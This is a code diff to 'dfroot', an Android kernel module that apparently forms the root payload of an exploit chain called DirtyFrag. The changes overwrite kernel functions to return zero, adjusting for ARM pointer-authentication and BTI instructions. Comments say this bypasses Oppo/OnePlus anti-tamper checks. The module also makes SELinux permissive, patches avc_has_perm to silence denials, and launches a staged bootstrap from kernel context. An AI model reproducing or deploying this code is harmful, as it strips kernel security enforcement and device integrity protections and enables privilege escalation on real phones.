@@ -33,18 +33,38 @@ MODULE_PARM_DESC(bootstrap, "Absolute path of the staged DirtyFrag bootstrap exe
 
 static __nocfi void patch_fn_ret_zero(void *fn)
 {
-    void *addrs[3];
-    u32 insns[3];
+    u32  insn  = *(u32 *)fn;
+    int  skip  = 0;
+    bool pac_a = false, pac_b = false;
+    void *addrs[2];
+    u32   insns[2];
 
-    addrs[0] = fn;
-    addrs[1] = (u8 *)fn + 4;
-    addrs[2] = (u8 *)fn + 8;
+    while (skip < 2) {
+        switch (insn) {
+        case 0xD503233F: pac_a = true; goto skip_insn; /* PACIASP */
+        case 0xD503237F: pac_b = true; goto skip_insn; /* PACIBSP */
+        case 0xD503241F:                               /* BTI     */
+        case 0xD503245F:                               /* BTI c   */
+        case 0xD503249F:                               /* BTI j   */
+        case 0xD50324DF:                               /* BTI jc  */
+        skip_insn:
+            insn = *(u32 *)((u8 *)fn + ++skip * 4);
+            continue;
+        }
+        break;
+    }
 
-    insns[0] = 0xD503245F;  // BTI C  (valid landing pad, NOP when BTI not enforced)
-    insns[1] = 0xD2800000;  // MOV x0, #0
-    insns[2] = 0xD65F03C0;  // RET
+    addrs[0] = (u8 *)fn + skip * 4;
+    addrs[1] = (u8 *)fn + skip * 4 + 4;
+    insns[0] = 0xD2800000;
+    /* PACIASP/PACIBSP are hint-space NOPs on CPUs without ARMv8.3 pointer auth,
+     * but RETAA/RETAB are not — they fault as undefined. Only emit them when
+     * hardware auth is actually present and the signed LR needs stripping. */
+    insns[1] = (pac_b && system_supports_address_auth()) ? 0xD65F0FFF :
+               (pac_a && system_supports_address_auth()) ? 0xD65F0BFF :
+                                                           0xD65F03C0;
 
-    if (insn_patch_text(addrs, insns, 3))
+    if (insn_patch_text(addrs, insns, 2))
         pr_warn("dfroot: patch failed at %px\n", fn);
 }
 
@@ -64,12 +84,20 @@ static int __nocfi __init dfroot_init(void)
     void *info;
     int ret;
 
-    // UMH command to run
+    // UMH command to run. Upstream 4.2-4.5 replaced the old
+    // "touch /dev/dfm0; rmmod oplus_* 2>/dev/null; exit 0" chain. Those rmmods
+    // tripped the Oppo/OnePlus security anti-tamper reset (our issue #21), and
+    // because `sh -c` returns the exit code of the LAST command, a failing
+    // rmmod also made the helper report "returned 256" everywhere else, which
+    // is what killed the run at the verify stage (our issue #5). The vendor
+    // hardening checks are now patched in-kernel with aarch64_insn_patch_text,
+    // the helper only touches the marker and execs bootstrap, and the call is
+    // UMH_WAIT_EXEC, so there is no child exit status left to leak.
     static const char sh[] = "/system/bin/sh";
     static char cmd[512];
     static char *envp[] = { "PATH=/system/bin", NULL };
     static char *argv[] = { (char *)sh, "-c", cmd, NULL };
-    snprintf(cmd, sizeof(cmd), "touch /dev/dfm0; echo -n 'u:r:init:s0' > /proc/self/attr/exec; exec %s", bootstrap);
+    snprintf(cmd, sizeof(cmd), "touch /dev/dfm0; exec %s", bootstrap);
 
     // Symbol finder
     kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
@@ -115,8 +143,8 @@ static int __nocfi __init dfroot_init(void)
     pr_info("dfroot: selinux_state permissive\n");
 
     // Some kernels ship CONFIG_SECURITY_SELINUX_DEVELOP=n, so the selinux_state
-    // write above is a no-op there — patch the SELinux checks themselves instead
-    // (both: most denials surface through the noaudit path first).
+    // write above is a no-op there — patch the SELinux checks themselves
+    // instead (most denials surface through the noaudit path first).
     avc_fn = (void *)get_addr("avc_has_perm");
     if (!avc_fn)
         pr_err("dfroot: avc_has_perm not found, skipping\n");
